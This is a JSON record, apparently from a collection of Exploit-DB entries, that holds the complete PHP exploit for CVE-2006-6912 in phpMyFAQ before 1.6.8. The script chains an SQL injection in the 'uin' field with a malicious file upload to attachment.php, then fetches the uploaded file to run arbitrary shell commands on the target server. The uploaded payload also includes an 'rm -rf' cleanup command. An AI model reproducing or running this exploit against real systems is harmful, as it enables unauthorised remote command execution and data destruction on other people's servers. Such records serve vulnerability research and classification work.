{
  "id": "3393",
  "title": "phpMyFAQ 1.6.7 - SQL Injection / Command Execution",
  "cve": "CVE-2006-6912",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/php5-cgi -q\r\n<?\r\n\r\n/*\r\nSql injection / remote command execution exploit for phpmyfaq < 1.6.8\r\n\r\nBugtraq:\r\nhttps://www.securityfocus.com/bid/21944\r\n\r\nCVS:\r\nhttp://thinkforge.org/plugins/scmcvs/cvsweb.php/phpmyfaq/admin/attachment.php.diff?r1=1.7.2.11.2.5;r2=1.7.2.11.2.6;cvsroot=phpmyfaq;f=h\r\n\r\n./pmf.php http://xxxx.xxxx.edu/faq/ \"<? system('id'); ?>\" localhost:4001\r\n\r\nelgCrew@safe-mail.net\r\n*/\r\n\r\nfunction do_upload($baseurl, $proxy, $cmd)\r\n{\r\n\r\n\t$fp = fopen(\"kebab.php\", \"w\");\r\n\tif(!$fp)\r\n\t\tdie(\"Cannot open file for writing\");\r\n\r\n\t$code = \"Un1q\" . $cmd . \"<? system(\\\"rm -rf ../1337/\\\"); ?>\";\r\n\tfwrite($fp, $code);\r\n\tfclose($fp);\r\n\t\r\n\t$sendvars[\"aktion\"] = \"save\";\r\n        $sendvars[\"uin\"] = \"-1' UNION SELECT char(0x61,0x64,0x6d,0x69,0x6e),char(0x61,0x61,0x27,0x20,0x4f,0x52,0x20,0x31,0x3d,0x31,0x20,0x2f,0x2a) /*\";\r\n        $sendvars[\"save\"] = \"TRUE\";\r\n        $sendvars[\"MAX_FILE_SIZE\"] = \"100000\";\r\n        $sendvars[\"id\"] = \"1337\";\r\n        $sendvars[\"userfile\"] = '@kebab.php';\r\n        $sendvars[\"filename\"] = \"kebab.php\";\r\n\r\n        $posturl = $baseurl . \"/admin/attachment.php\";\r\n        $ch = curl_init();\r\n\r\n        curl_setopt($ch, CURLOPT_URL, $posturl);\r\n\r\n        curl_setopt($ch, CURLOPT_PROXY, $proxy);\r\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\r\n        curl_setopt($ch, CURLOPT_POST, 1);\r\n\r\n        curl_setopt($ch, CURLOPT_POSTFIELDS, $sendvars);\r\n        echo \"=> Uploading file.\\n\";\r\n        $result = curl_exec($ch);\r\n\tcurl_close($ch);\r\n\t@unlink(\"kebab.php\");\r\n\t$get =  $baseurl . \"/attachments/1337/kebab.php\\n\";\r\n\r\n\t$ch = curl_init();\r\n\tcurl_setopt($ch, CURLOPT_URL, $get);\r\n\tcurl_setopt($ch, CURLOPT_PROXY, $proxy);\r\n\tcurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\r\n\t$result = curl_exec($ch);\r\n\tif(strstr($result, \"Un1q\"))\r\n\t\techo substr($result, 4);\r\n\telse\r\n\t\techo \"Not vulnerable / error ?\\n\";\r\n\tcurl_close($ch);\r\n\r\n\r\n}\r\n\r\nif($argc < 3)\r\n{\r\n\tprintf(\"Usage: %s http://test.com/phpmyfaq/ \\\"<? system('uname -a'); ?> \\\" [proxy]\\n\", $argv[0]);\r\n\texit(0);\r\n}\r\nif($argc == 4)\r\n\t$proxy = $argv[3];\r\nelse\r\n\t$proxy = \"\";\r\n\r\ndo_upload($argv[1], $proxy, $argv[2]);\r\n\r\n?>\r\n\r\n# milw0rm.com [2007-03-01]",
  "url": "https://www.exploit-db.com/exploits/3393"
}